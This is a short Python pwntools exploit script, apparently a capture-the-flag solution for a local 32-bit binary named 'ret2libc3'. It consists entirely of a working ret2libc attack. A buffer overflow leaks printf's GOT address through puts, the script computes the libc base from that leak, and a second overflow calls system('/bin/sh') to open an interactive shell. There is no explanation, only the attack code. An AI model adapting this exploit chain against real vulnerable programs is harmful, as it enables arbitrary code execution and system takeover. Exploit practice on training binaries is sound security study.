from pwn import *

pad = 112
elf = ELF("./ret2libc3")

lokal = True

if lokal:
    s = elf.process()
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")


log.info("Leaking address")
puts = elf.plt['puts']
printfgot = elf.got['printf']
main = elf.symbols['main']

payload = 'A'*pad
payload += p32(puts)
payload += p32(main)
payload += p32(printfgot)

s.sendlineafter("!?",payload)
log.info("Receiving address")
printf_leaked = u32(s.recvline()[0:4])
print printf_leaked

log.info("Got Libc Addr base")
libc.address = printf_leaked - libc.symbols['printf']
print libc.address

system = libc.symbols['system']
binsh = libc.search('/bin/sh').next()

payload = 'A'*104
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)

s.sendline(payload)
s.interactive()
